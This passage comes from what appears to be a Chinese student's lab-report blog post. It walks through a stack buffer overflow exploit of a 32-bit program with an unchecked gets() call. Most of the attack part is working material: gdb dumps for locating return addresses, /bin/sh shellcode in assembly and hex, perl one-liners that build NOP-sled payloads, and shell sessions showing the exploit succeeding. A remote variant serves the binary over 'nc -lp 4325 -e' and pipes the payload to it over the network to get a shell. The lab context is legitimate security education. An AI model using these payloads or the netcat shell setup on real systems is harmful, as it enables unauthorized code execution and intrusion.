(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x895350e3      0x6e69622f      0x68732f2f
0xffffcfdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si
0xffffcfd2 in ?? ()
(gdb) x/16x 0xffffcfbc
0xffffcfbc:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfcc:     0x896e6962      0x00000000      0x6e69622f      0x68732f2f
0xffffcfdc:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcfec:     0xf7c237c5      0x00000001      0xffffd0a4      0xffffd0ac
(gdb) si

Program received signal SIGSEGV, Segmentation fault.
0xffffcfd2 in ?? ()
</code></pre>
<h5 id="33-15使用其他shellcode">3.3-1.5使用其他shellcode</h5>
<p>从网上找了另外一段getshell的shellcode。由于shellcode长度较短，push较少，不会导致覆盖源码，可以正常运行</p><pre><code class="language-assembly">mov al,0xb;
xor edx,edx;
xor ecx,ecx;
push ecx;
push 0x68732f2f;
push 0x6e69622f;
mov ebx,esp;
int 0x80
</code></pre>
<p>同之前相同，寻找返回地址后构造攻击代码</p><pre><code class="language-shell">perl -e &#39;print &quot;\xb0\x0b\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbc\xcf\xff\xff\x00&quot;&#39; &gt; input20214325
</code></pre>
<p>尝试攻击</p><pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input20214325; cat) | ./pwn20214325

�
 1�1�Qh//shh/bin�����������������
ls
input  input20214325  input_shellcode_20214325  pwn20214325
</code></pre>
<p>攻击成功，得到控制权限</p><h4 id="33-2方法二：nopshellcoderetaddr">3.3-2方法二：nop+shellcode+retaddr</h4>
<figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/image-20240317225052841.png" alt="image-20240317225052841"  data-is-external-image="true"></figure><h5 id="33-21构造要注入的payload">3.3-2.1构造要注入的payload</h5>
<pre><code class="language-shell">perl -e &#39;print &quot;A&quot; x 32;print &quot;\xe0\xcf\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x90\x00\xd3\xff\xff\x00&quot;&#39; &gt; input_shellcode_20214325
</code></pre>
<h5 id="33-22寻找要返回的地址">3.3-2.2寻找要返回的地址</h5>
<pre><code class="language-shell">(gdb) attach 212112
Attaching to process 212112
Reading symbols from /home/kali/Desktop/ShareFolder/exp1/pwn20214325...
(No debugging symbols found in /home/kali/Desktop/ShareFolder/exp1/pwn20214325)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
0xf7fc8579 in __kernel_vsyscall ()
(gdb) disassemble foo
Dump of assembler code for function foo:
   0x08048491 &lt;+0&gt;:     push   %ebp
   0x08048492 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048494 &lt;+3&gt;:     sub    $0x38,%esp
   0x08048497 &lt;+6&gt;:     lea    -0x1c(%ebp),%eax
   0x0804849a &lt;+9&gt;:     mov    %eax,(%esp)
   0x0804849d &lt;+12&gt;:    call   0x8048330 &lt;gets@plt&gt;
   0x080484a2 &lt;+17&gt;:    lea    -0x1c(%ebp),%eax
   0x080484a5 &lt;+20&gt;:    mov    %eax,(%esp)
   0x080484a8 &lt;+23&gt;:    call   0x8048340 &lt;puts@plt&gt;
   0x080484ad &lt;+28&gt;:    leave
   0x080484ae &lt;+29&gt;:    ret
End of assembler dump.
(gdb) break *0x080484ae
Breakpoint 1 at 0x80484ae
(gdb) c
Continuing.

Breakpoint 1, 0x080484ae in foo ()
(gdb) info r esp
esp            0xffffcfac          0xffffcfac
(gdb) x/16x 0xffffcfac
0xffffcfac:     0xffffcfe0      0x90909090      0xc0319090      0x2f2f6850
0xffffcfbc:     0x2f686873      0x896e6962      0x895350e3      0xb0d231e1
0xffffcfcc:     0x9080cd0b      0xffffd300      0x08040000      0x00000001
0xffffcfdc:     0xffffd074      0xf7e1dff4      0x080484d0      0xf7ffcba0
(gdb) x/16x 0xffffcfb0 ##这里能看到构造的滑行区，因此我们把返回地址改为ffff cfb0即可
0xffffcfb0:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffcfc0:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffcfd0:     0xffffd300      0x08040000      0x00000001      0xffffd074
0xffffcfe0:     0xf7e1dff4      0x080484d0      0xf7ffcba0      0x00000000
(gdb) Quit
</code></pre>
<h5 id="33-23尝试攻击">3.3-2.3尝试攻击</h5>
<p>攻击代码</p><pre><code class="language-shell">perl -e &#39;print &quot;A&quot; x 32;print &quot;\xb0\xcf\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x90\x00&quot;&#39; &gt; input_shellcode_20214325
</code></pre>
<p>进行攻击</p><pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input_shellcode_20214325; cat) | ./pwn20214325

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����������1�Ph//shh/bin��PS��1Ұ
                                                               �

ls
input_shellcode_20214325  pwn20214325
cd ..
ls
exp1
</code></pre>
<p>攻击成功，得到控制权限</p><h2 id="4结合nc模拟远程攻击">4结合nc模拟远程攻击</h2>
<h3 id="41远程输入攻击字符串，覆盖返回地址，触发getshell函数">4.1远程输入攻击字符串，覆盖返回地址，触发getShell函数</h3>
<h4 id="411攻击输入">4.1.1攻击输入</h4>
<pre><code class="language-shell">echo &quot;11111222223333344444555556666677\x7d\x84\x04\x08&quot; &gt; input20214325
</code></pre>
<h4 id="412靶机">4.1.2靶机</h4>
<pre><code class="language-shell">nc -lp 4325 -e ./pwn20214325
</code></pre>
<p>查看端口监听状态</p><pre><code class="language-shell">┌──(kali㉿kali)-[~]
└─$ sudo lsof -i -P -n | grep LISTEN                                       

nc        459610 kali    3u  IPv4 812457      0t0  TCP *:4325 (LISTEN)
</code></pre>
<h4 id="413攻击端">4.1.3攻击端</h4>
<pre><code class="language-shell">(cat input20214325; cat) | nc 192.168.255.138 4325
</code></pre>
<h4 id="414攻击结果">4.1.4攻击结果</h4>
<pre><code class="language-shell">┌──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input20214325; cat) | nc 192.168.255.138 4325

ls
pwn20214325
cd ..
ls
Desktop
Documents
Downloads
input20214325
Music
Pictures
Public
Templates
Videos
whoami
kali
</code></pre>
<p>攻击成功，得到控制权限</p><h3 id="42远程注入一个自己的shellcode并运行">4.2远程注入一个自己的shellcode并运行</h3>
<h4 id="421寻找返回地址">4.2.1寻找返回地址</h4>
<pre><code class="language-shell">(gdb) attach 490064
Attaching to process 490064
Reading symbols from /home/kali/Desktop/pwn20214325...
(No debugging symbols found in /home/kali/Desktop/pwn20214325)
Reading symbols from /lib32/libc.so.6...
(No debugging symbols found in /lib32/libc.so.6)
Reading symbols from /lib/ld-linux.so.2...
(No debugging symbols found in /lib/ld-linux.so.2)
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
0xf7fc8579 in __kernel_vsyscall ()
(gdb) disassemble foo
Dump of assembler code for function foo:
   0x08048491 &lt;+0&gt;:     push   %ebp
   0x08048492 &lt;+1&gt;:     mov    %esp,%ebp
   0x08048494 &lt;+3&gt;:     sub    $0x38,%esp
   0x08048497 &lt;+6&gt;:     lea    -0x1c(%ebp),%eax
   0x0804849a &lt;+9&gt;:     mov    %eax,(%esp)
   0x0804849d &lt;+12&gt;:    call   0x8048330 &lt;gets@plt&gt;
   0x080484a2 &lt;+17&gt;:    lea    -0x1c(%ebp),%eax
   0x080484a5 &lt;+20&gt;:    mov    %eax,(%esp)
   0x080484a8 &lt;+23&gt;:    call   0x8048340 &lt;puts@plt&gt;
   0x080484ad &lt;+28&gt;:    leave
   0x080484ae &lt;+29&gt;:    ret
End of assembler dump.
(gdb) break *0x080484ae
Breakpoint 1 at 0x80484ae
(gdb) c
Continuing.

Breakpoint 1, 0x080484ae in foo ()
(gdb) info r esp
esp            0xffffd02c          0xffffd02c
(gdb) x/16x 0xffffd02c
0xffffd02c:     0xffc71ba2      0x90909090      0xc0319090      0x2f2f6850
0xffffd03c:     0x2f686873      0x896e6962      0x895350e3      0xb0d231e1
0xffffd04c:     0x9080cd0b      0xffffd300      0x08040000      0x00000001
0xffffd05c:     0xffffd0f4      0xf7e1dff4      0x080484d0      0xf7ffcba0
(gdb) x/16x 0xffffd030
0xffffd030:     0x90909090      0xc0319090      0x2f2f6850      0x2f686873
0xffffd040:     0x896e6962      0x895350e3      0xb0d231e1      0x9080cd0b
0xffffd050:     0xffffd300      0x08040000      0x00000001      0xffffd0f4
0xffffd060:     0xf7e1dff4      0x080484d0      0xf7ffcba0      0x00000000
(gdb) quit
</code></pre>
<h4 id="422构造攻击输入">4.2.2构造攻击输入</h4>
<pre><code class="language-shell">perl -e &#39;print &quot;A&quot; x 32;print &quot;\x30\xd0\xff\xff\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x90\x00\xd3\xff\xff\x00&quot;&#39; &gt; input_shellcode_20214325
</code></pre>
<h4 id="423靶机">4.2.3靶机</h4>
<pre><code class="language-shell">nc -lp 4325 -e ./pwn20214325
</code></pre>
<h4 id="424攻击端">4.2.4攻击端</h4>
<pre><code class="language-shell">(cat input_shellcode_20214325; cat) | nc 192.168.255.138 4325
</code></pre>
<h4 id="425攻击结果">4.2.5攻击结果</h4>
<pre><code class="language-shell">──(kali㉿jyc20214325)-[~/Desktop/ShareFolder/exp1]
└─$ (cat input_shellcode_20214325; cat) | nc 192.168.255.138 4325

ls
pwn20214325
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
input20214325
</code></pre>
<p>攻击成功，得到控制权限</p><h2 id="心得体会">心得体会</h2>
<p>通过本次实验，我不仅掌握了BOF攻击的基础知识，更巩固了之前在操作系统，计组等课上学到的基础知识。对C语言如何从源码到编译为机器码，再反汇编并分析其功能，漏洞都有了更深刻的理解。</p><p>通过一次次反汇编和查找返回地址，我也初步掌握了汇编语言，能够分析程序在内存中的行为。</p><p>也学会了在linux中使用gdb调试程序的方法，刚开始时我还不太适应gdb中查看内存时奇怪的地址顺序，在做了一些小实验和记录之后也能够熟练的分析其中的内存数据了。下方附上简单的标注参考供大家学习gdb中的内存看法（标注为地址最后两位）：</p><figure class="post__image"><img loading="lazy" src="https://raw.githubusercontent.com/ufkal/blog_pic/main/%E5%9B%BE%E7%89%872.png" alt="图片2"  data-is-external-image="true"></figure><p>实验过程中对<a href="#jump">3.3-1.4分析失败原因</a>部分内容问题较多，通过和<strong>20214321吴萌源</strong>进行交流分析之后终于彻底理解了出错的原因，并在之后找到了一段更短，Push操作更少的shellcode实现了方法一的攻击</p>
            ]]>
        </content>
    </entry>
</feed>
